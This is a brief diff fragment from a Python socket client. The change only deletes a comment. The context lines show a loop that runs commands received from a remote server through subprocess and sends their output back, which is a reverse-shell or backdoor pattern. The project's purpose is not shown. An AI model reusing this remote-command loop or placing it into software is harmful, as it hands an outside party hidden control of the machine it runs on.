@@ -21,7 +21,6 @@ def start_client(server_ip, server_port):
 
             command = data.decode("utf-8", errors="ignore")
 
-            # execute the command
             try:
                 output = subprocess.getoutput(command)
                 client.send(output.encode())
